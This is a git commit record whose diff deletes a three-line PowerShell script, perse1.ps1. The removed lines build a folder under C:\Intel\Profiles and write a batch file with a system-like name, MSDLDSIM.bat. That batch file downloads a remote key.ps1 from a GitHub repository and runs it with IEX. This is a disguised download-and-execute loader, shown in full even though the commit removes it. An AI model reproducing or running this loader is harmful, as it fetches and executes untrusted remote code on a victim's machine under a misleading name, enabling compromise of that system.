6b117bd79ccf323d2bb5e2f8a90013296248ee95
alejq41 <93050806+alejq41@users.noreply.github.com>
2023-05-07 19:07:33 +0200

    Delete perse1.ps1

--- perse1.ps1
+++
@@ -1,3 +0,0 @@
-md C:\Intel\Profiles/IE/IEX2; $contentToAdd = @"
-powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/key.ps1').GetResponse().GetResponseStream()).ReadToEnd());
-"@; add-content "C:\Intel\Profiles/IE/IEX2/MSDLDSIM.bat" $contenttoadd;
